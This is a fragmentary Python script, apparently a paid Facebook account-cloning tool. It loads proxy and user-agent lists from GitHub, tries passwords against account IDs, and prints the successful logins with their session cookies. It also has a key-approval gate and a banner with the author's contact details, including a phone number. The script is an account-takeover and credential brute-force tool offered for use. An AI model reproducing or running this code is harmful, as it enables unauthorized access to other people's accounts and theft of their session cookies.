...
princp=[]
try:
	prox= requests.get('https://github.com/AJMIR-HOSSAIN-404/Api/blob/main/prox.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/AJMIR-HOSSAIN-404/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'AJMIR-404' and password == 'FUCK YOU':
...
os.system('espeak -a 300 " Welcome,   to,  Ajmir,  King,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-AJMIR ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Ajmir Hossain]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAJMIR-HOSSAIN-404 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01813225678 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Ajmir-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Ajmir-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/AJMIR-HOSSAIN-404/Public-CloNing/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Ajmir+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Ajmir+''+key1
